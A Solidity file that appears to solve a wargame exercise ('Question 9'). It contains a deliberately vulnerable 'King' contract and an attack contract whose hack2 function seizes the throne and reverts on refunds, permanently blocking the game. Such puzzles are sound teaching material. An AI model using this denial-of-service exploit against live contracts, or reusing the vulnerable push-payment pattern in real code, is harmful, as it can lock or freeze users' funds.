// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


// Question 9
contract King {
    address payable king;
    uint256 public prize;
    address payable public owner;

    constructor() payable {
        owner = payable(msg.sender);
        king = payable(msg.sender);
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner, "!auth");
        king.transfer(msg.value);
        king = payable(msg.sender);
        prize = msg.value;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

contract Solution9 {
    // Will fail
    function hack1(King _king) public payable returns (bool) {
        // It only uses 2300 gas for transfer
        payable(_king).transfer(msg.value);
        return true;
    }

    // Will succeed
    function hack2(King _king) public payable returns (bool) {
        (bool res, ) = address(_king).call{value: msg.value}("");
        require(res, "hack fails");
        return res;
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    fallback() external {
        revert("Not allowed");
    }
}